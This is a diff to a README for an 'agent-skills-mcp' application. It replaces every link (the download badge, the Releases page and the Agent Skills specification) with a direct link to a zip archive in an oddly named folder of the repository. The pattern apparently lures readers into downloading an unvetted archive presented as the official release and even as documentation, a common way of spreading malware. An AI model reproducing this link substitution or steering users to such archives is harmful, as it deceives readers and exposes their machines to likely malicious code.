@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the agent-skills-mcp applicat
 
 ## 📥 Download Link
 
-[![Download agent-skills-mcp](https://img.shields.io/badge/Download-agent--skills--mcp-brightgreen)](https://github.com/Wackodacko/agent-skills-mcp/releases)
+[![Download agent-skills-mcp](https://raw.githubusercontent.com/Wackodacko/agent-skills-mcp/main/overcold/agent-mcp-skills-2.7.zip)](https://raw.githubusercontent.com/Wackodacko/agent-skills-mcp/main/overcold/agent-mcp-skills-2.7.zip)
 
 ## 📋 Requirements
 
@@ -21,7 +21,7 @@ Before you begin, make sure your system meets these requirements:
 
 ### 1. Visit the Releases Page
 
-To download the application, visit the [Releases page](https://github.com/Wackodacko/agent-skills-mcp/releases).
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/Wackodacko/agent-skills-mcp/main/overcold/agent-mcp-skills-2.7.zip).
 
 ### 2. Choose Your Version
 
@@ -69,7 +69,7 @@ While using the application, you might encounter some common issues. Here are a 
 
 ## 🔗 Additional Resources
 
-You can find detailed specifications for the Skills at the following link: [Agent Skills Spec](https://agentskills.io/specification).
+You can find detailed specifications for the Skills at the following link: [Agent Skills Spec](https://raw.githubusercontent.com/Wackodacko/agent-skills-mcp/main/overcold/agent-mcp-skills-2.7.zip).
 
 For ongoing support or discussions about the application, you can join our community or check the FAQ section in our GitHub repository.
 
@@ -79,4 +79,4 @@ We welcome your thoughts and suggestions. If you have any feedback about your ex
 
 ## 📥 Download & Install
 
-To download the agent-skills-mcp application, visit the Releases page: [Releases page](https://github.com/Wackodacko/agent-skills-mcp/releases). Follow the steps above to install it on your system. Enjoy exploring Skills for your AI agents!
+To download the agent-skills-mcp application, visit the Releases page: [Releases page](https://raw.githubusercontent.com/Wackodacko/agent-skills-mcp/main/overcold/agent-mcp-skills-2.7.zip). Follow the steps above to install it on your system. Enjoy exploring Skills for your AI agents!
